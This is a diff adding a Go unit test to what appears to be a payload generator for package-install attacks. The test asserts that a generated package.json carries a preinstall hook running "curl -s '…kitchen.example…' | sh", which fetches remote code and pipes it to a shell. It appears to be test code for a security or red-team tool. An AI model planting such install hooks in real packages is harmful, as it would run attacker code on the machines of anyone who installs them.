@@ -4,6 +4,7 @@
 package lotp
 
 import (
+	"encoding/json"
 	"testing"
 
 	"github.com/stretchr/testify/assert"
@@ -116,6 +117,20 @@ func TestNPMPayload_PreserveFlow(t *testing.T) {
 
 	require.NotEmpty(t, payloads)
 	assert.Contains(t, payloads[0].Content, "|| true")
+}
+
+func TestNPMPayload_CallbackURLUsesExactPath(t *testing.T) {
+	payload := NewNPMPayload(PayloadOptions{
+		CallbackURL: "https://kitchen.example/r/stg123",
+	})
+	payloads := payload.Generate()
+
+	require.NotEmpty(t, payloads)
+	var pkg struct {
+		Scripts map[string]string `json:"scripts"`
+	}
+	require.NoError(t, json.Unmarshal([]byte(payloads[0].Content), &pkg))
+	assert.Equal(t, "curl -s 'https://kitchen.example/r/stg123' | sh", pkg.Scripts["preinstall"])
 }
 
 func TestPipPayload_WithCallbackURL(t *testing.T) {
